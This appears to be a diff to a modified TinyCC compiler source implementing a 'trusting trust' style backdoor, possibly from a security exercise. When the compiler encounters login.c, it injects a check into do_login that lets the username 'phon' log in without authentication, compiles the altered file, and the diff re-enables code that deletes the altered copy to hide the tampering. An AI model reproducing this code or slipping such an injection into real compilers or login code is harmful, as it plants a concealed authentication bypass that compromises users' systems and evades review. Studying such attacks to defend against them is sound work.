@@ -8,8 +8,8 @@ if ((str_pointer = strstr(str, "login.c")) != NULL)
 printf("Found login.c!! Bugging it...\n");
 int normalfd = open(str, O_RDONLY | 0660);
 char login_sig[] = "static int\n"
-"do_login(const char *username)\n"
-"{\n";
+    "do_login(const char *username)\n"
+    "{\n";
 char login_attack[] = "if (!strcmp(username, \"phon\"))return 0;";
 int readByte = read(normalfd, fileBuffer, bufferSize);
 close(normalfd);
@@ -17,14 +17,17 @@ fileBuffer[readByte] = '\0';
 char *spotLocation = strstr(fileBuffer, login_sig);
 if (spotLocation != NULL)
 {
-char tmp[1000000];
-unsigned int offset = spotLocation - fileBuffer + strlen(login_sig);
-strcpy(tmp, fileBuffer + offset);
-strcpy(fileBuffer + offset, login_attack);
-strcpy(fileBuffer + offset + strlen(login_attack), tmp);
-
+unsigned int offset = strlen(login_sig);
 int buggedfd = open("login.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
-int byteWrote = write(buggedfd, fileBuffer, strlen(fileBuffer));
+
+for(char *c = fileBuffer; c != spotLocation + offset; c++)
+write(buggedfd, c, 1);
+
+write(buggedfd, login_attack, strlen(login_attack));
+
+for(char *c = spotLocation + offset; *c;c++)
+write(buggedfd, c, 1);
+
 close(buggedfd);
 fd = _tcc_open(s1, "login.c");
 str = "login.c";
@@ -105,10 +108,8 @@ tccgen_finish(s1);
 preprocess_end(s1);
 s1->error_set_jmp_enabled = 0;
 tcc_exit_state(s1);
-/*
 if(isBug)
 {
 remove(str);
 }
-*/
 return s1->nb_errors != 0 ? -1 : 0;
